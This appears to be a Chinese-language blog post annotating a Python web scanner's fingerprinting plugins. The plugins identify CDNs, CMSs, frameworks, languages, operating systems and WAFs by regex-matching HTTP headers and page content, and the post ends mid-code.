title="fastly.py"></a>fastly.py</h4><p>请求hostname查看cname返回包中师傅存在fastly.net</p><pre><code class="python">def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                for answer in dns_query:                    _ |= re.search(r&#39;fastly\.net&#39;, str(answer), re.I) is not None            if _:                return &quot;Fastly CDN&quot;</code></pre><h3 id="cms指纹识别"><a href="#cms指纹识别" class="headerlink" title="cms指纹识别"></a>cms指纹识别</h3><p>CMS识别原理就是得到一些CMS的一些固有特征，通过得到这个特征来判断CMS的类别。</p><h4 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h4><p>三个search任意一个结果为1 _就是true，然后返回时drupal cms</p><p>但是这里问题很大：有部分开发者会除自带的Drupal.settings</p><p><a href="https://www.yangshengliang.com/jianzhanxitong/drupal/1407.html" target="_blank" rel="external">drupal 7 移除自带的 css 和 javascript 及jQuery.extend(Drupal.settings,</a></p><p>drupal7后第二条匹配规则就算是失效了。</p><p>三条匹配规则还需要添加</p><pre><code class="python">class Drupal(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #使用 Python 的原始字符串，只需加一个 r 前缀            # | 指明两项之间的一个选择            #在url中寻找/misc/drupal.js或者content中是否有power by Drupal这样去检测drupal            _ = re.search(r&#39;src=&quot;\S*/misc/drupal.js*|Powered by Drupal, an open source content management system&#39;,                          content) is not None            #\S匹配任何非空白字符 jQuery中Drupal.extend            #扫描content中匹配存在/misc/drupal.css或jQuery中的Drupal.settings或Drupal.extend            _ |= re.search(r&#39;\S*/misc/drupal.css&quot;|jQuery.extend\WDrupal.settings|Drupal.extend\W&#39;, content) is not None            #匹配meta标签存在name=&quot;Generator&quot; content=&quot;Drupal&#39;            _ |= re.search(r&#39;&lt;meta name=&quot;Generator&quot; content=&quot;Drupal&#39;, content) is not None            if _:                return &quot;Drupal&quot;        except Exception as e:            print(e)</code></pre><h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><p>两重判断</p><pre><code class="python">class Joomla(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #匹配url中的/index.php?option= 或 meta标签name=&quot;generator&quot; content=&quot;Joomla 或匹配 源码存在Powered by &lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt;            _ = re.search(                r&#39;/index.php?option=(\S*)|&lt;meta name=&quot;generator&quot; content=&quot;Joomla*|Powered by &lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt;*&#39;,                content) is not None            if _:                #二次判断是否存在/templates/目录，re.I忽略大小写                if re.search(&#39;/templates/*&#39;, content, re.I):                    return &quot;Joomla&quot;        except Exception as e:            print(e)</code></pre><h4 id="magento"><a href="#magento" class="headerlink" title="magento"></a>magento</h4><pre><code class="python">class Magento(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:          #页面特征较多，做一个循环判断，主要原理是网页中发现关键字            for x in (&#39;x-magento-init&#39;, &#39;Magento_*&#39;, &#39;images/logo.gif&quot; alt=&quot;Magento Commerce&quot; /&gt;&lt;/a&gt;&lt;/h1&gt;&#39;,                      &#39;&lt;a href=&quot;http://www.magentocommerce.com/bug-tracking&quot; id=&quot;bug_tracking_link&quot;&gt;&lt;strong&gt;Report All Bugs&lt;/strong&gt;&lt;/a&gt;&#39;,                      &#39;&lt;meta name=&quot;keywords&quot; content=&quot;Magento, Varien, E-commerce&quot; /&gt;&#39;, &#39;mage/cookies.js&quot; &gt;&lt;/script&gt;&#39;,                      &#39;&lt;div id=&quot;noscript-notice&quot; class=&quot;magento-notice&quot;&gt;&#39;):                #判断_是true                _ = re.search(x, content) is not None                if _:                    return &quot;Magento&quot;        except Exception as e:            print(e)</code></pre><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><p>结构特征. Web应用的类型可由其特殊的结构设计准确识别, 该指纹只需从HTML数据的头部获取. 例如, 如果Web应用的文件路径包含/wp-includes/, 则该Web应用是Wordpress.</p><pre><code class="python">class Wordpress(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #循环寻找指定URL的关键字来判断是否存在各个Wordpress的url文件夹            for x in (&#39;/wp-admin/&#39;, &#39;/wp-content/&#39;, &#39;/wp-includes/&#39;, &#39;&lt;meta name=&quot;generator&quot; content=&quot;WordPress&#39;):                _ = re.search(x, content) is not None            if _:                return &quot;Wordpress&quot;        except Exception as e:            print(e)</code></pre><h3 id="framework指纹识别"><a href="#framework指纹识别" class="headerlink" title="framework指纹识别"></a>framework指纹识别</h3><p>在framework下面对更多种类的框架进行了识别。这里倒是可以自己增加一些额外的框架识别代码，进行扩充。</p><pre><code>│   │   │   ├── framework│   │   │   │   ├── cakephp.py│   │   │   │   ├── cherrypy.py│   │   │   │   ├── dancer.py│   │   │   │   ├── django.py│   │   │   │   ├── flask.py│   │   │   │   ├── fuelphp.py│   │   │   │   ├── grails.py│   │   │   │   ├──` __init__.py`│   │   │   │   ├── laravel.py│   │   │   │   ├── mvc.py│   │   │   │   ├── nette.py│   │   │   │   ├── phalcon.py│   │   │   │   ├── rails.py│   │   │   │   ├── symfony.py│   │   │   │   ├── yii.py│   │   │   │   └── zend.py</code></pre><h4 id="cakephp"><a href="#cakephp" class="headerlink" title="cakephp"></a>cakephp</h4><p> 原理： header特别字段cakephp=的正则匹配</p><pre><code class="python">class Cakephp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有cakephp=            _ = re.search(r&#39;cakephp=&#39;, item[1], re.I) is not None            if _:                return &quot;CakePHP (PHP)&quot;</code></pre><h4 id="cherrypy"><a href="#cherrypy" class="headerlink" title="cherrypy"></a>cherrypy</h4><p> 原理： header特别字段CherryPy的正则匹配</p><pre><code class="python">class Cherrypy(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配headers中value值是否有CherryPy        for item in headers.items():            _ = re.search(r&#39;CherryPy&#39;, item[1], re.I) is not None            if _:                return &quot;CherryPy (Python)&quot;</code></pre><h4 id="dancer"><a href="#dancer" class="headerlink" title="dancer"></a>dancer</h4><p> 原理：header特别字段Dancer和dancer.session的正则匹配</p><pre><code class="python">class Dancer(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Dancer或存在dancer.session            _ |= re.search(r&#39;Dancer|dancer\.session=.*&#39;, item[1], re.I) is not None        if _:            return &quot;Dancer (Perl)&quot;</code></pre><h4 id="django"><a href="#django" class="headerlink" title="django"></a>django</h4><p> 原理：header特别字段csrftoken的正则匹配</p><pre><code class="python">class Django(FingerprintPlugin):    def process(self, headers, content):        _ = False        #csrftoken是django中防止csrf的机制        for item in headers.items():            _ = re.search(r&#39;csrftoken=&#39;, item[1], re.I) is not None            if _:                return &quot;Django (Python)&quot;</code></pre><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><p> 原理： header特别字段flask的正则匹配</p><pre><code class="python">class Flask(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配header头value值是否有flask            _ = re.search(r&#39;flask&#39;, item[1], re.I) is not None            if _:                return &quot;Flask (Python)&quot;</code></pre><h4 id="fuelphp"><a href="#fuelphp" class="headerlink" title="fuelphp"></a>fuelphp</h4><p> 原理： header特别字段fuelcid= 或者 content特别字段Powered by <code>&lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;</code>的正则匹配</p><pre><code class="python">class Fuelphp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##header头value值匹配fuelcid=            _ = re.search(r&#39;fuelcid=&#39;, item[1], re.I) is not None            #两个匹配规则 按位或运算符,如果content中匹配存在Powered by &lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt; 那么_判定为true            _ |= re.search(r&#39;Powered by &lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;&#39;, content) is not None            if _:                return &quot;FuelPHP (PHP)&quot;</code></pre><h4 id="grails"><a href="#grails" class="headerlink" title="grails"></a>grails</h4><p> 原理：header key值和value值的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190225142058.png" alt=""></p><p>headers的代码形式{‘k1’:’v1’, ‘k2’:’v2’}</p><p>item是个list,遍历出来的item是个二元数组 (‘k1’, ‘v1’)</p><p>item[0]是key值，item[1]是value值 </p><pre><code class="python">class Grails(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #遍历header头匹配value值是Grails            _ = re.search(r&#39;Grails&#39;, item[1], re.I) is not None            #遍历header头匹配key值是X-Grails或X-Grails-Cached            _ |= re.search(r&#39;X-Grails|X-Grails-Cached&#39;, item[0], re.I) is not None            if _:                return &quot;Grails (Java)&quot;</code></pre><h4 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h4><p> 原理： header字段的value值特别为laravel_session=的正则匹配</p><pre><code class="python">class Laravel(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #header头value值匹配laravel_session=            _ = re.search(r&#39;laravel_session=&#39;, item[1], re.I) is not None            if _:                return &quot;Laravel (PHP)&quot;</code></pre><h4 id="mvc"><a href="#mvc" class="headerlink" title="mvc"></a>mvc</h4><p> 原理：header特别字段的正则匹配</p><pre><code class="python">class Mvc(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配response headers中是否有x-aspnetmvc-version或__requestverificationtoken            _ = re.search(r&#39;x-aspnetmvc-version|__requestverificationtoken&#39;, str(item), re.I) is not None            if _:                return &quot;ASP.NET MVC&quot;</code></pre><h4 id="nette"><a href="#nette" class="headerlink" title="nette"></a>nette</h4><p> 原理： header特别字段<code>nette*或nette-browser=*</code>的正则匹配</p><pre><code class="python">class Nette(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers头中value值是否有nette*或nette-browser=*            _ = re.search(r&#39;nette*|nette-browser=*&#39;, item[1], re.I) is not None            if _:                return &quot;Nette (PHP)&quot;</code></pre><h4 id="phalcon"><a href="#phalcon" class="headerlink" title="phalcon"></a>phalcon</h4><p> 原理：header特别字段<code>phalcon-auth-*或Phalcon [(https://phalconphp.com/)]*</code>的正则匹配</p><pre><code class="python">class Phalcon(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers头中value值是否有phalcon-auth-*或Phalcon [(https://phalconphp.com/)]*            _ = re.search(r&#39;phalcon-auth-*&#39;, item[1], re.I) is not None            _ |= re.search(r&#39;Phalcon [(https://phalconphp.com/)]*&#39;, item[1]) is not None            if _:                return &quot;Phalcon (C and PHP)&quot;</code></pre><h4 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h4><p> 原理：header key值和value值的正则匹配</p><pre><code class="python">class Rails(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #遍历header头匹配value值是Grails            _ = re.search(r&#39;rails*|_rails_admin_session=*|x-rails&#39;, item[1], re.I) is not None            #遍历header头匹配key值是rails*或x-rails            _ |= re.search(r&#39;rails*|x-rails&#39;, item[0], re.I) is not None            if _:                return &quot;Rails (Ruby)&quot;</code></pre><h4 id="symfony"><a href="#symfony" class="headerlink" title="symfony"></a>symfony</h4><p> 原理： header特别字段symfony=*的正则匹配</p><pre><code class="python">class Symfony(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有symfony=*            _ = re.search(r&#39;symfony=*&#39;, item[1], re.I) is not None            if _:                return &quot;Symfony PHP&quot;</code></pre><h4 id="yii"><a href="#yii" class="headerlink" title="yii"></a>yii</h4><p> 原理： header特别字段_csrf=* 或者 匹配content特别字段Powered by <code>&lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;</code>的正则匹配</p><pre><code class="python">class Yii(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有_csrf=*            _ = re.search(r&#39;_csrf=*&#39;, item[1], re.I) is not None            #或者匹配content中存在Powered by &lt;a href=&quot;http://www.yiiframework.com/&quot; rel=&quot;external&quot;&gt;Yii Framework&lt;/a&gt;            _ |= re.search(r&#39;Powered by &lt;a href=&quot;http://www.yiiframework.com/&quot; rel=&quot;external&quot;&gt;Yii Framework&lt;/a&gt;&#39;,                           content) is not None            if _:                return &quot;Yiiframework (PHP)&quot;</code></pre><h4 id="zend"><a href="#zend" class="headerlink" title="zend"></a>zend</h4><p>原理： header特别字段<code>Zend</code>的正则匹配</p><pre><code class="python">class Zend(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有Zend            _ = re.search(r&#39;Zend&#39;, item[1], re.I) is not None            if _:                return &quot;Zend (PHP)&quot;</code></pre><h3 id="fronted指纹识别"><a href="#fronted指纹识别" class="headerlink" title="fronted指纹识别"></a>fronted指纹识别</h3><p>前端框架指纹识别</p><pre><code>│   │   │   ├── frontend│   │   │   │   ├── angularjs.py│   │   │   │   ├── emberjs.py│   │   │   │   ├── __init__.py│   │   │   │   ├── jquery.py│   │   │   │   ├── knockout.py│   │   │   │   ├── meteorjs.py│   │   │   │   ├── mootools.py│   │   │   │   ├── prototype.py│   │   │   │   ├── reactjs.py│   │   │   │   └── vuejs.py</code></pre><h4 id="angularjs"><a href="#angularjs" class="headerlink" title="angularjs"></a>angularjs</h4><p>原理：三条匹配规则 有一则规则触发就是AngularJS，主要依靠content特别字段的正则匹配</p><pre><code class="python">class Angularjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #re.I:忽略大小写 匹配content中是否有ng-app        _ = re.search(r&#39;ng-app&#39;, content, re.I) is not None        #或者匹配content中是否有ng-version        _ |= re.search(r&#39;ng-version&#39;, content, re.I) is not None        #或者匹配content中是否有app-root        _ |= re.search(r&#39;app-root&#39;, content, re.I) is not None        if _:            return &quot;AngularJS (Google)&quot;</code></pre><h4 id="emberjs"><a href="#emberjs" class="headerlink" title="emberjs"></a>emberjs</h4><p>原理：主要依靠原理： header特别字段的正则匹配</p><pre><code class="python">class Emberjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有ember-view            _ = re.search(r&#39;ember-view&#39;, item[1], re.I) is not None            if _:                return &quot;EmberJs (Javascript)&quot;</code></pre><h4 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Jquery(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有jquery-[0-9\-\.]+.js或者存在jquery        #举例子:jquery-5.js        _ = re.search(r&#39;jquery-[0-9\-\.]+.js|jquery&#39;, content, re.I) is not None        if _:            return &quot;JQuery (Javascript)&quot;</code></pre><h4 id="knockout"><a href="#knockout" class="headerlink" title="knockout"></a>knockout</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Knockout(FingerprintPlugin):    def process(self, headers, content):        _ = False        #举例子knockout-5-..js        #匹配content中是否有knockout-[0-9\-\.]+.js        _ = re.search(r&#39;knockout-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;Knockout (Javascript)&quot;</code></pre><h4 id="meteorjs"><a href="#meteorjs" class="headerlink" title="meteorjs"></a>meteorjs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code>class Meteorjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有__meteor_runtime_config__        _ = re.search(r&#39;__meteor_runtime_config__&#39;, content, re.I) is not None        if _:            return &quot;MeteorJS (Javascript)&quot;</code></pre><h4 id="mootools"><a href="#mootools" class="headerlink" title="mootools"></a>mootools</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Mootools(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有MooTools-[0-9\-\.]+.js        _ = re.search(r&#39;MooTools-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;MooTools (Javascript)&quot;</code></pre><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Prototype(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有prototype-[0-9\-\.]+.js或者prototype.js        _ = re.search(r&#39;prototype.js&#39;, content, re.I) is not None        _ |= re.search(r&#39;prototype-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;Prototype (Javascript)&quot;</code></pre><h4 id="reactjs"><a href="#reactjs" class="headerlink" title="reactjs"></a>reactjs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Reactjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有react-[0-9\-\.]+.js或者reactroot或者reactid        _ = re.search(r&#39;react-[0-9\-\.]+.js&#39;, content, re.I) is not None        _ = re.search(r&#39;reactroot|reactid&#39;, content, re.I) is not None        if _:            return &quot;ReactJS (Javascript)&quot;</code></pre><h4 id="vuejs"><a href="#vuejs" class="headerlink" title="vuejs"></a>vuejs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Vuejs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有v-bind或者v-for或者v-if        _ |= re.search(r&#39;v-bind|v-for|v-if&#39;, content, re.I) is not None        if _:            return &quot;VueJS (Javascript)&quot;</code></pre><h3 id="lang指纹识别"><a href="#lang指纹识别" class="headerlink" title="lang指纹识别"></a>lang指纹识别</h3><p> 对采用何种编程语言的识别</p><pre><code>│   │   │   ├── lang│   │   │   │   ├── asp.py│   │   │   │   ├── __init__.py│   │   │   │   ├── java.py│   │   │   │   ├── perl.py│   │   │   │   ├── php.py│   │   │   │   ├── python.py│   │   │   │   └── ruby.py</code></pre><p> 对采用何种编程语言的识别有点意思，也是response header和content部分特别字段的正则匹配。</p><p>看下python语言的识别。lang/python.py:</p><h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Asp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##匹配header中是否有ASP.NET或X-AspNet-Version或x-aspnetmvc-version            _ = re.search(r&#39;ASP.NET|X-AspNet-Version|x-aspnetmvc-version&#39;, str(item), re.I) is not None            #\W匹配非字母字符，即匹配特殊字符。匹配content是否有__VIEWSTATE， \W匹配非字母字符，即匹配特殊字符            if not _:                _ |= re.search(r&#39;(__VIEWSTATE\W*)&#39;, content) is not None            #$：匹配字符串末尾 匹配content是否有.asp或者aspx            if not _:                _ |= re.search(r&#39;\.asp$|\.aspx$&#39;, content) is not None            if _:                return &quot;ASP.NET&quot;</code></pre><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Java(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##匹配headers中的是否有Java或Servlet或JSP或JBoss或Glassfish或Oracle或JRE或JDK|或SESSIONID            _ = re.search(r&#39;Java|Servlet|JSP|JBoss|Glassfish|Oracle|JRE|JDK|JSESSIONID&#39;, str(item)) is not None            if not _:                #匹配content中字符串的末尾存在.jsp或.jspx或.do或.wss或.action                _ |= re.search(r&#39;\.jsp$|\.jspx$|.do$|\.wss$|\.action$&#39;, content) is not None            if _:                return &quot;Java&quot;</code></pre><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Perl(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中字符串的末尾存在.pl或.cgi        _ = re.search(r&#39;\.pl$|\.cgi$&#39;, content) is not None        if _:            return &quot;Perl&quot;</code></pre><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Php(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有X-PHP-PID或PHP2、php3、php4等 或 PHPSESSID            _ = re.search(r&#39;X-PHP-PID|PHP\S*|PHPSESSID&#39;, str(item)) is not None            #匹配content中字符串的末尾存在.php或.phtml        _ |= re.search(r&#39;\.php$|\.phtml$&#39;, content) is not None        if _:            return &quot;PHP&quot;</code></pre><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>原理：主要依靠 header和content特别字段的正则匹配</p><pre><code class="python">class Python(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有python或zope或zserver或wsgi或plone或_ZopeId            _ = re.search(r&#39;python|zope|zserver|wsgi|plone|_ZopeId&#39;, item[1], re.I) is not None        #匹配content中字符串的末尾存在.py        _ |= re.search(r&#39;\.py$&#39;, content) is not None        if _:            return &quot;Python&quot;</code></pre><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><p>原理：主要依靠response header和content特别字段的正则匹配</p><pre><code class="python">class Ruby(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有mod_rack或phusion或passenger            _ = re.search(r&quot;mod_rack|phusion|passenger&quot;, item[1], re.I) is not None        #匹配content中字符串的末尾存在.rb或.rhtml        _ |= re.search(r&#39;\.rb$|\.rhtml$&#39;, content) is not None        if _:            return &quot;Ruby&quot;</code></pre><h3 id="system指纹识别"><a href="#system指纹识别" class="headerlink" title="system指纹识别"></a>system指纹识别</h3><p>这个识别还是很粗糙的，因为很多时候http response里面server部分有时候没内容，然后os部分有时候也没有内容。</p><h4 id="bsd"><a href="#bsd" class="headerlink" title="bsd"></a>bsd</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Bsd(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配headers中的是否有任何非空白字符+BSD        for item in headers.items():            _ = re.search(r&#39;\S*BSD&#39;, str(item), re.I) is not None            if _:                return &quot;BSD&quot;</code></pre><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Linux(FingerprintPlugin):    def process(self, headers, content):        for item in headers.items():            #re.findall匹配的全部字串，返回形式为数组            _ = re.findall(          r&#39;linux|ubuntu|gentoo|debian|dotdeb|centos|redhat|sarge|etch|lenny|squeeze|wheezy|jessie|red hat|scientific linux&#39;,                str(item), re.I)            #如果匹配到两个则返回第一个匹配到的，如果匹配一个或者两个以上也返回第一个匹配到的            if _:                if len(_) == 2:                    return _[0]                else:                    return _[0]</code></pre><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Mac(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有Mac或MacOS或非空白字符MacOS*            _ = re.search(r&#39;Mac|MacOS|MacOS\S*&#39;, str(item)) is not None            if _:                return &quot;MacOS&quot;</code></pre><h4 id="solaris"><a href="#solaris" class="headerlink" title="solaris"></a>solaris</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Solaris(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有solaris或sunos或opensolaris或sparc64或sparc            _ = re.search(r&#39;solaris|sunos|opensolaris|sparc64|sparc&#39;, str(item), re.I) is not None            if _:                return &quot;Solaris&quot;</code></pre><h4 id="unix"><a href="#unix" class="headerlink" title="unix"></a>unix</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Unix(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有unix            _ = re.search(r&#39;unix&#39;, str(item), re.I) is not None            if _:                return &quot;Unix&quot;</code></pre><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Windows(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有windows或win32            _ = re.search(r&#39;windows|win32&#39;, str(item), re.I) is not None            if _:                return &quot;Windows&quot;</code></pre><h3 id="waf指纹识别"><a href="#waf指纹识别" class="headerlink" title="waf指纹识别"></a>waf指纹识别</h3><pre><code>│   │   │   └── waf│   │   │       ├── airlock.py│   │   │       ├── anquanboa.py│   │   │       ├── aws.py│   │   │       ├── baidu.py│   │   │       ├── barracuda.py│   │   │       ├── bigip.py│   │   │       ├── binarysec.py│   │   │       ├── blockdos.py│   │   │       ├── chinacache.py│   │   │       ├── ciscoacexml.py│   │   │       ├── cloudflare.py│   │   │       ├── cloudfront.py│   │   │       ├── dotdefender.py│   │   │       ├── edgecast.py│   │   │       ├── fortiweb.py│   │   │       ├── hyperguard.py│   │   │       ├── incapsula.py│   │   │       ├── __init__.py│   │   │       ├── isaserver.py│   │   │       ├── kona.py│   │   │       ├── modsecurity.py│   │   │       ├── netcontinuum.py│   │   │       ├── paloalto.py│   │   │       ├── profense.py│   │   │       ├── radware.py│   │   │       ├── requestvalidationmode.py│   │   │       ├── safedog.py│   │   │       ├── secureiis.py│   │   │       ├── sengnix.py│   │   │       ├── sitelock.py│   │   │       ├── sonicwall.py│   │   │       ├── sucuri.py│   │   │       ├── trafficshield.py│   │   │       ├── varnish.py│   │   │       ├── wallarm.py│   │   │       └── webknight.py</code></pre><h4 id="airlock"><a href="#airlock" class="headerlink" title="airlock"></a>airlock</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226094050.png" alt=""></p><pre><code class="python">class Airlock(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有^AL[_-]SESS[_-]S=\S*            _ = re.search(r&#39;^AL[_-]SESS[_-]S=\S*&#39;, item[1], re.I) is not None            #匹配headers中key值的是否有X-Airlock-Test            _ |= re.search(r&#39;X-Airlock-Test&#39;, item[0], re.I) is not None            if _:                return &quot;InfoGuard Airlock (Phion/Ergon)&quot;</code></pre><h4 id="anquanboa"><a href="#anquanboa" class="headerlink" title="anquanboa"></a>anquanboa</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Anquanboa(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-Powered-By-Anquanbao            _ = re.search(r&#39;X-Powered-By-Anquanbao&#39;, item[0], re.I) is not None            if _:                return &quot;Anquanbao Firewall&quot;</code></pre><h4 id="aws"><a href="#aws" class="headerlink" title="aws"></a>aws</h4><p>原理：三条匹配规则，主要依靠header特别字段的正则匹配</p><pre><code class="python">class Aws(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有aws*            _ = re.search(r&#39;aws*&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-amz-id-0、x-amz-id-1、x-amz-id-2            _ |= re.search(r&#39;x-amz-id-[0-2]&#39;, item[0], re.I) is not None            #匹配headers中key值是否有x-amz-request-id            _ |= re.search(r&#39;x-amz-request-id&#39;, item[0], re.I) is not None            if _:                return &#39;Amazon Web Services Web Application Firewall (Amazon)&#39;</code></pre><h4 id="baidu"><a href="#baidu" class="headerlink" title="baidu"></a>baidu</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Baidu(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有yunjiasu-nginx            _ = re.search(r&#39;yunjiasu-nginx&#39;, item[1], re.I) is not None            #匹配headers中value值是否有YJS-ID            _ |= re.search(r&#39;YJS-ID&#39;, item[1], re.I) is not None            #匹配headers中value值是否有fhl            _ |= re.search(r&#39;fhl&#39;, item[1], re.I) is not None            if _:                return &quot;Yunjiasu Web Application Firewall (Baidu)&quot;</code></pre><h4 id="barracuda"><a href="#barracuda" class="headerlink" title="barracuda"></a>barracuda</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Barracuda(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有barracuda*            _ = re.search(r&#39;barracuda*&#39;, item[1], re.I) is not None            #匹配headers中value值是否有barra_counter_session=            _ |= re.search(r&#39;barra_counter_session=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有barracuda_            _ |= re.search(r&#39;barracuda_&#39;, item[1], re.I) is not None            if _:                return &quot;Barracuda Web Application Firewall (Barracuda Networks)&quot;</code></pre><h4 id="bigip"><a href="#bigip" class="headerlink" title="bigip"></a>bigip</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226100504.png" alt=""></p><pre><code class="python">class Bigip(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有BigIP或BIGipServer            _ = re.search(r&#39;BigIP|BIGipServer&#39;, item[1], re.I) is not None            #匹配headers中value值是否有TS+至少匹配4次+=            _ |= re.search(r&#39;TS\w{4,}=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有F5            _ |= re.search(r&#39;F5&#39;, item[1], re.I) is not None            if _:                return &quot;BIG-IP Application Security Manager (F5 Networks)&quot;</code></pre><h4 id="binarysec"><a href="#binarysec" class="headerlink" title="binarysec"></a>binarysec</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Binarysec(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            